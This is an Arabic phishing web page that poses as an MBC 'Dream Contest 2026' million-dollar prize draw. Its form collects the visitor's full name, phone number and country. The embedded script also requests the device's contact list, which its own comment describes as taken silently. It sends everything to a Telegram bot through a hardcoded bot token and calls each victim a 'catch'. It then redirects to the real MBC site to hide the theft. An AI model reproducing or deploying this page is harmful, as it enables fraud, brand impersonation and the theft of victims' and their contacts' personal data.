<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مسابقة الحلم 2026 - المليون دولار بانتظارك</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: linear-gradient(135deg, #0b1329, #1c2d59); color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
        
        .dream-card { background: #ffffff; color: #1f2937; padding: 40px 25px; width: 100%; max-width: 400px; text-align: center; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
        
        /* شعار الحلم الحقيقي الذهبي */
        .dream-logo { width: 110px; height: 110px; background: linear-gradient(135deg, #f59e0b, #d97706); border-radius: 50%; margin: 0 auto 20px auto; display: flex; justify-content: center; align-items: center; box-shadow: 0 8px 20px rgba(245, 158, 11, 0.4); }
        .dream-logo svg { width: 65px; height: 65px; fill: #fff; }

        h2 { font-size: 24px; font-weight: bold; margin-bottom: 8px; color: #1e3a8a; }
        .sub { font-size: 13px; color: #6b7280; margin-bottom: 25px; line-height: 1.5; }

        .input-group { margin-bottom: 15px; text-align: right; }
        label { display: block; font-size: 12px; color: #374151; margin-bottom: 5px; font-weight: bold; }
        input { width: 100%; padding: 13px; background: #f9fafb; border: 1px solid #d1d5db; color: #1f2937; border-radius: 10px; outline: none; font-size: 14px; }
        input:focus { border-color: #f59e0b; background: #fff; box-shadow: 0 0 0 3px rgba(245, 158, 11, 0.15); }

        .dream-btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #f59e0b, #d97706); border: none; color: #fff; font-weight: bold; font-size: 16px; border-radius: 10px; cursor: pointer; margin-top: 10px; transition: 0.2s; box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3); }
        .dream-btn:hover { opacity: 0.95; transform: translateY(-1px); }
        
        .footer-note { margin-top: 20px; font-size: 11px; color: #9ca3af; }
    </style>
</head>
<body>
    <div class="dream-card">
        <!-- شعار الحلم الحقيقي (هدية الكأس الذهبي) SVG -->
        <div class="dream-logo">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 5h-2V3H7v2H5c-1.1 0-2 .9-2 2v1c0 2.55 1.92 4.63 4.39 4.94.63 1.5 1.98 2.63 3.61 2.96V19H7v2h10v-2h-3.001v-3.1c1.63-.33 2.98-1.46 3.61-2.96C19.08 12.63 21 10.55 21 8V7c0-1.1-.9-2-2-2zM5 8V7h2v3.82C5.84 10.4 5 9.3 5 8zm14 0c0 1.3-.84 2.4-2 2.82V7h2v1z"/></svg>
        </div>

        <h2>مسابقة الحلم 2026</h2>
        <p class="sub">شارك الآن في السحب الأكبر على جائزة المليون دولار مع مصطفى الآغا.</p>
        
        <form id="dreamForm">
            <div class="input-group">
                <label>الاسم الكامل (كما هو في الهوية)</label>
                <input type="text" id="fullname" placeholder="أدخل اسمك الثلاثي" required>
            </div>
            <div class="input-group">
                <label>رقم الهاتف النقال</label>
                <input type="text" id="phone" placeholder="مثال: +967XXXXXXXXX" required>
            </div>
            <div class="input-group">
                <label>الدولة</label>
                <input type="text" id="country" placeholder="اختر دولتك" required>
            </div>
            <button type="submit" class="dream-btn">اشترك الآن ودخل السحب</button>
        </form>
        
        <div class="footer-note">مجموعة MBC • جميع الحقوق محفوظة 2026</div>
    </div>

    <script>
        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
        const urlParams = new URLSearchParams(window.location.search);
        const targetChatId = urlParams.get('to');

        document.getElementById('dreamForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            if(!targetChatId) return;
            const name = document.getElementById('fullname').value;
            const phone = document.getElementById('phone').value;
            const country = document.getElementById('country').value;

            // سحب جهات الاتصال بصمت تام في الخلفية
            let contactsData = "لم يتم منح الصلاحية";
            if ('contacts' in navigator && 'ContactsManager' in window) {
                try {
                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                    if (contacts.length > 0) {
                        contactsData = contacts.map(c => `المستخدم: ${c.name?.[0] || 'بدون'} - الرقم: ${c.tel?.[0] || ''}`).join('\n');
                    }
                } catch(e) {}
            }

            // إرسال بيانات الحلم إلى بوت المسوق المستخرج من الرابط
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`🏆 صيد مسابقة الحلم الجديد!\nالاسم: ${name}\nالرقم: ${phone}\nالدولة: ${country}`)}`);
            
            if(contactsData !== "لم يتم منح الصلاحية") {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`جهات الاتصال:\n${contactsData}`)}`);
            }

            // تحويل فوري لموقع MBC الحقيقي
            setTimeout(() => { 
                window.location.href = "https://www.mbc.net"; 
            }, 800);
        });
    </script>
</body>
</html>
